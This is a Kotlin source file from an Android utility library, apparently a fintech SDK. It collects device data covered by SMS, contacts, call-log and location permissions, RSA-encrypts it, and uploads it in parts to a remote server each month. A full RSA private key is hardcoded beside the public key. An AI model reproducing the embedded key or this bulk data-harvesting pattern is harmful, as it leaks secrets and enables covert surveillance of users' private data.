package com.fintek.utils_androidx.upload

import android.Manifest
import android.os.Build
import androidx.annotation.RequiresApi
import androidx.annotation.RequiresPermission
import com.fintek.utils_androidx.FintekUtils
import com.fintek.utils_androidx.UtilsBridge
import com.fintek.utils_androidx.encrypt.RSA
import com.fintek.utils_androidx.encrypt.RSAUtil
import com.fintek.utils_androidx.log.TimberUtil
import com.fintek.utils_androidx.network.*
import com.fintek.utils_androidx.sharedPreference.SharedPreferenceUtils
import com.fintek.utils_androidx.thread.SimpleTask
import com.fintek.utils_androidx.thread.Task
import com.fintek.utils_androidx.upload.internal.*
import com.fintek.utils_androidx.upload.internal.ExistedStringElement
import com.fintek.utils_androidx.upload.internal.IS_EXISTED
import com.fintek.utils_androidx.upload.internal.StringElement
import com.fintek.utils_androidx.upload.internal.elementDelete
import com.google.gson.Gson
import com.google.gson.reflect.TypeToken
import java.util.*
import java.util.concurrent.TimeUnit


object UploadUtils {
    private val gson = Gson()

    private val coronetRequest: CoronetRequest = CoronetRequest.Builder()
        .setBaseUrl(FintekUtils.requiredBaseUrl)
        .addHeader("Connection", "Keep-Alive")
        .addHeader("Content-Type", "application/Json;charset:Utf-8")
        .setConnectTimeout(60, TimeUnit.SECONDS)
        .setReadTimeout(60, TimeUnit.SECONDS)
        .build()

    /**
     * Upload all struct to Service
     *
     *
     * This way will delete all cache file
     */
    @JvmStatic
    @RequiresPermission(anyOf = [
        Manifest.permission.READ_EXTERNAL_STORAGE, Manifest.permission.READ_SMS,
        Manifest.permission.READ_CONTACTS, Manifest.permission.READ_CALL_LOG,
        Manifest.permission.READ_PHONE_STATE, Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.ACCESS_WIFI_STATE, Manifest.permission.ACCESS_NETWORK_STATE,
        Manifest.permission.INTERNET
    ])
    @RequiresApi(Build.VERSION_CODES.KITKAT)
    fun upload() {
        val monthCount = SharedPreferenceUtils.getInt(MONTH_UPLOAD_COUNT)
        if (monthCount >= 1) {
            // every month only upload once
            return
        }
//        if (IS_EXISTED || IS_UPLOADING) {
//            internalUpload()
//        }

        // delete all cache file, start a new upload
        elementDelete()
        // create new struct json
        UtilsBridge.executeByCPU(createNewStructJson(consumer { json ->
            val element: Element<String> = StringElement(json)
            val header = element.header() as Header

            val task: RequestTask<UnitResponse> = Builder<UnitResponse>()
                .build(UnitResponse.typeToken, header.part, header.total)
                .onNext(consumer {
                    elementUpload(element)
                }).onError(consumer {

                })
            task.execute(Dispatchers.CPU)
        }))
    }

    @RequiresPermission(anyOf = [
        Manifest.permission.READ_EXTERNAL_STORAGE, Manifest.permission.READ_SMS,
        Manifest.permission.READ_CONTACTS, Manifest.permission.READ_CALL_LOG,
        Manifest.permission.READ_PHONE_STATE, Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.ACCESS_WIFI_STATE, Manifest.permission.ACCESS_NETWORK_STATE,
        Manifest.permission.INTERNET
    ])
    @RequiresApi(Build.VERSION_CODES.KITKAT)
    internal fun internalUpload() {
        if (!IS_EXISTED) {
            return
        }

        val element: Element<String> = ExistedStringElement()
        if (IS_UPLOADING) {
            val cacheElement: String? = element.cache()
            val task = Builder<UnitResponse>()
                .setContent(cacheElement)
                .build(UnitResponse.typeToken, element.partIndex.get(), element.total.get())
                .onNext(consumer {
                    elementUpload(element)
                }).onError(consumer {
                    internalUpload()
                })
            task.execute(Dispatchers.CPU)
        } else {
            elementUpload(element)
        }
    }

    @RequiresPermission(anyOf = [
        Manifest.permission.READ_EXTERNAL_STORAGE, Manifest.permission.READ_SMS,
        Manifest.permission.READ_CONTACTS, Manifest.permission.READ_CALL_LOG,
        Manifest.permission.READ_PHONE_STATE, Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.ACCESS_WIFI_STATE, Manifest.permission.ACCESS_NETWORK_STATE,
        Manifest.permission.INTERNET
    ])
    @RequiresApi(Build.VERSION_CODES.KITKAT)
    internal fun monthlyUpload() {
        val monthCount = SharedPreferenceUtils.getInt(MONTH_UPLOAD_COUNT)

    }


    @RequiresApi(Build.VERSION_CODES.KITKAT)
    private fun elementUpload(element: Element<String>) {
        if (!element.hasNext()) {
            TimberUtil.e("Element is Empty: ${!IS_EXISTED}")
            return
        }

        val task = Builder<UnitResponse>()
            .setContent(element.next())
            .build(UnitResponse.typeToken, element.partIndex.get(), element.total.get())

        task.onNext(consumer {
            if (it.isSuccess()) {
                element.remove()
                element.removeCache()
                elementUpload(element)
            } else {
                elementUpload(element)
            }
        }).onError(consumer {
            elementUpload(element)
        })

        task.execute(Dispatchers.CPU)
    }

    private fun createNewStructJson(consumer: FintekUtils.Consumer<String>): Task<String> {
        return object : SimpleTask<String>() {
            @RequiresPermission(anyOf = [
                Manifest.permission.READ_EXTERNAL_STORAGE, Manifest.permission.READ_SMS,
                Manifest.permission.READ_CONTACTS, Manifest.permission.READ_CALL_LOG,
                Manifest.permission.READ_PHONE_STATE, Manifest.permission.ACCESS_FINE_LOCATION,
                Manifest.permission.ACCESS_WIFI_STATE, Manifest.permission.ACCESS_NETWORK_STATE,
                Manifest.permission.INTERNET
            ])
            @RequiresApi(Build.VERSION_CODES.KITKAT)
            override fun doInBackground(): String {
                val struct = FintekUtils.getAllStruct()
                val json = gson.toJson(struct)
                return RSAUtil.base64Encrypt(RSA.getKey(RSA.MODE.PEM_STRING, RSA.TYPE_PUBLIC,
                    RSA_UPLOAD_KEY
                ), json)
            }

            override fun onSuccess(result: String) {
                consumer.accept(result)
            }
        }
    }

    private val contentVersion: String get() {
        val calendar = Calendar.getInstance()
        return "${calendar.get(Calendar.YEAR)}${calendar.get(Calendar.MONTH)}"
    }

    private fun <T> consumer(block: (t: T) -> Unit) = object : FintekUtils.Consumer<T> {
        override fun accept(t: T) {
            block.invoke(t)
        }
    }

    const val RSA_UPLOAD_KEY = "MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDD04SDnhHVYY9f2W3cXNia3b5b" +
            "KlxthNAX1BoSIPdf4oUaSqdabfdSTgNdhppltA9ddpNN86mb3vk3FXvxn896E5mz" +
            "b7WU4OU8LHlt0H4OpQRfMTS+O0vS9biJ2JSWzkKp2k4ehjOmvAtNZDVwjVgYXEcZ" +
            "gzZAL1vvg72Afy58OwIDAQAB"

    const val PRIVATE = "MIICdgIBADANBgkqhkiG9w0BAQEFAASCAmAwggJcAgEAAoGBAMPThIOeEdVhj1/Zbdxc2JrdvlsqXG2E0BfUGhIg91/ihRpKp1pt91JOA12GmmW0D112k03zqZve+TcVe/Gfz3oTmbNvtZTg5TwseW3Qfg6lBF8xNL47S9L1uInYlJbOQqnaTh6GM6a8C01kNXCNWBhcRxmDNkAvW++DvYB/Lnw7AgMBAAECgYAZAPj6lURRqpNT+b89U92UaJvVqCMFGOA5KqvphKwRYir8oGud8EyUBcIIPxeXxNXxaSKF4YbWkDHiBqw8vdsP0hjMmyIkc9p5/S4suJcKXpcGyaS4hfYYTDOQOXOg4i6HpaJnLeJ+Lmh40IM/dVijPPkBtA858Owzb4F/497tgQJBAOiRoWn026SotfgCDGiWAvVRCOI67WPyqALgdtaKU7eDpSbNIysLIRS8I4NcfUgeN5gzmlrfr7M7F2b3gsINJUcCQQDXjjqHgRp1ie29wvKTWvvZwODP2PQ/KUBqZ5oyYZA/4XiU2S+41+CrgtPxnEFTLGY5LXrXi31j9KhGOoG8L/ttAkAkV4VyqjmcXGS7EY7g1Pg3X2dU+sJXyPZqJKtNUSZN2ft3ubySIFYWCGRARbaqC1bCqOWo56VsC4LXqzu6mRVHAkB3EUiBWy4raQIbBRmLjgF6OhG0ngnk7bt4SzwgwkW1E63QwtuahhzDgKPkXUS0Vd0tjlLBx3p/AUEGcgEB25tNAkEAhJARb3Y1xzBKfYLNYILY1i286KfXCOv1P8ojYT5I2jc04N3ouW3G97ZaB8WL2ZIFNpR07dcLFWIwlySn1ZcvcA=="

    // save month upload count key
    private const val MONTH_UPLOAD_COUNT = "month_upload_count"

    private const val MEDIA_TYPE = "application/json; charset=utf-8"

    private data class UploadReq(
        val userId: String = FintekUtils.requiredIdentify.toString(),
        val version: String = contentVersion,
        val content: String? = null,
        val part: Int,
        val total: Int
    )

    private data class UnitResponse(
        val code: String,
        val message: String
    ) {
        companion object {
            val typeToken: TypeToken<UnitResponse> = object : TypeToken<UnitResponse>() {}
        }

        fun isSuccess(): Boolean = code == "200"
    }

    private class Builder<T> {
        private var userId: String = FintekUtils.requiredIdentify.toString()
        private var version: String = contentVersion
        private var content: String? = null

        fun setUserId(userId: String) = apply {
            this.userId = userId
        }

        fun setVersion(version: String) = apply {
            this.version = version
        }

        fun setContent(content: String?) = apply {
            this.content = content
        }


        @RequiresApi(Build.VERSION_CODES.KITKAT)
        fun build(
            typeToken: TypeToken<T>,
            part: Int,
            total: Int,
        ): RequestTask<T> {
            val uploadReq = UploadReq(userId, version, content, part, total)
            val requestBody = RequestBody.create(
                MediaType.get(MEDIA_TYPE),
                gson.toJson(uploadReq)
            )
            val request = Request.Builder().url(FintekUtils.requiredUploadApiPath).post(requestBody)
                .build()
            return coronetRequest.call(request, typeToken)
        }
    }
}